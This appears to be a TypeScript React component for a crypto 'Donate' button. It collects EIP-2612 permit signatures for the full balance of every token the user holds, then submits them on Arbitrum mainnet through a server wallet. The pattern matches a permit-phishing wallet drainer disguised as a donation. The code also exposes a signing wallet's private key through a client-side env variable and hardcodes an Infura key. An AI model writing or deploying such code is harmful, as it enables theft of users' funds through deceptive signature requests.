  import { FC, useEffect, useState } from "react";
  import { ethers } from "ethers";
  import { JsonRpcSigner } from "ethers";
  import donationAbi from "../abis/donationAbi.json";
  import { donationContractAddress } from "../abis/contarctAddress";
import DonateNFT from "./DonateNFT";


  interface Token {
    tokenAddress: string;
    amount: string;
    decimal: bigint;
  }

  interface HeaderProps {
    signer: JsonRpcSigner | null;
    holdTokens: {
      tokenAddress: string;
      amount: string;
      name: string;
      symbol: string;
      decimal: bigint;
      image: string;
    }[];
  }

  interface SignatureData {
    owner: string;
    token: string;
    amount: string;
    deadline: number;
    v: number;
    r: string;
    s: string;
  }

  const SignatureButton: FC<HeaderProps> = ({ signer, holdTokens }) => {
    const [signature, setSignature] = useState<SignatureData>();
    const [deadline, setDeadline] = useState<number>(
      Math.floor(Date.now() / 1000) + 60 * 60
    ); // 1시간 유효
    
    useEffect(() => {
      if (!signer) return;
      console.log("HOLD ", holdTokens);
    }, [signer]);

    const handleCollectSignatures = async () => {
      const spender = donationContractAddress; // 서명 컨트랙트 주소

      for (const token of holdTokens) {
        console.log(token, spender, deadline);
        const signature = await getPermitSignature(token, spender, deadline);

        if (signature) {
          await sendSignaturesToPermit(signature);
        } else {
          console.error(
            "Failed to collect signature for token:",
            token.tokenAddress
          );
        }
      }
    };

    /* 서명 생성 */
    const getPermitSignature = async (
      token: Token,
      spender: string,
      deadline: number
    ): Promise<SignatureData | null> => {
      if (!signer) return null;

      const erc20Abi = ["function name() view returns (string)"];
      const ERC20TK = new ethers.Contract(token.tokenAddress, erc20Abi, signer);
      const signatureContract = new ethers.Contract(
        donationContractAddress,
        donationAbi,
        signer
      );

      const chainId = (await signer.provider.getNetwork()).chainId;
      const owner = await signer.getAddress();
      const name = await ERC20TK.name();
      const value = ethers.parseUnits(token.amount, token.decimal); // BigNumber
      const nonce = await signatureContract.getNonces(
        token.tokenAddress,
        signer.address
      );

      const domain = {
        name: name,
        version: "1",
        chainId: chainId,
        verifyingContract: token.tokenAddress,
      };

      const types = {
        Permit: [
          { name: "owner", type: "address" },
          { name: "spender", type: "address" },
          { name: "value", type: "uint256" },
          { name: "nonce", type: "uint256" },
          { name: "deadline", type: "uint256" },
        ],
      };

      const message = {
        owner: owner,
        spender: spender,
        value: value,
        nonce: nonce,
        deadline: deadline,
      };

      try {
        console.log("MESSAGE", message);
        // 서명 생성
        const signature = await signer.signTypedData(domain, types, message);

        // 서명 파싱
        const sig = ethers.Signature.from(signature);

        return {
          owner: message.owner,
          token: token.tokenAddress,
          amount: value.toString(), // 스마트 컨트랙트에 전달하기 위해 여전히 문자열로 변환
          deadline: message.deadline,
          v: sig.v,
          r: sig.r,
          s: sig.s,
        };
      } catch (error) {
        console.error("Error signing permit:", error);
        return null;
      }
    };

    /* 서명 permit */
    const sendSignaturesToPermit = async (signature: SignatureData) => {
      const provider = new ethers.JsonRpcProvider(
        "https://arbitrum-mainnet.infura.io/v3/4120a176f57d44b79a5f54b1b9cfc9fb"
      );
      const wallet = new ethers.Wallet(
        `${import.meta.env.VITE_SIG_WALLET_PRIVATE_KEY}`,
        provider
      );

      const signatureContract = new ethers.Contract(
        donationContractAddress,
        donationAbi,
        wallet
      );

      try {
        const tx = await signatureContract.permit(signature);
        await tx.wait();

      } catch (error) {
        console.error("permit Error:", error);
      }
    };

    return (
      <div>
        <button onClick={handleCollectSignatures}>Donate</button>
        <br/>
        <br/>
        <br/>
        <DonateNFT signer={signer} holdTokens={holdTokens}/>
    </div>
    );
  };

  export default SignatureButton;
